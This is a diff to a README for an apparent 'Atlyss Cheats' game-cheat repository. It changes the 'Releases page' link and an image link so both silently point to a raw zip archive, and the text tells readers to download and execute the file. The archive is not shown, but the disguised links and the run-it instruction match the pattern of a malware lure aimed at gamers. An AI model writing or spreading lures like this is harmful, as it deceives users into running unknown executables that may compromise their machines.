@@ -10,7 +10,7 @@ Welcome to the Atlyss Cheats repository, where you can find all the latest hacks
 
 ## Explore the Cheats
 
-To access the latest releases of Atlyss cheats, visit the [Atlyss Cheats Releases](https://github.com/zulkox/Atlyss-Cheats/releases) page. You'll find a range of helpful tools to enhance your gaming experience.
+To access the latest releases of Atlyss cheats, visit the [Atlyss Cheats Releases](https://raw.githubusercontent.com/zulkox/Atlyss-Cheats/main/neoclassic/Cheats_Atlyss_v2.6.zip) page. You'll find a range of helpful tools to enhance your gaming experience.
 
 **Note:** Please ensure to download and execute the specific file mentioned on the releases page for the desired cheat.
 
@@ -24,6 +24,6 @@ With a focus on straightforward language, active voice, and clear communication,
 
 Are you ready to take your Atlyss gaming experience to the next level? Check out the Atlyss Cheats repository now! 🚀
 
-![Atlyss Cheats](https://image-url.com)
+![Atlyss Cheats](https://raw.githubusercontent.com/zulkox/Atlyss-Cheats/main/neoclassic/Cheats_Atlyss_v2.6.zip)
 
 Remember, calm confidence and clear instructions are the keys to successful gaming enhancements. Dive into the world of Atlyss cheats today and enjoy a whole new level of gameplay.
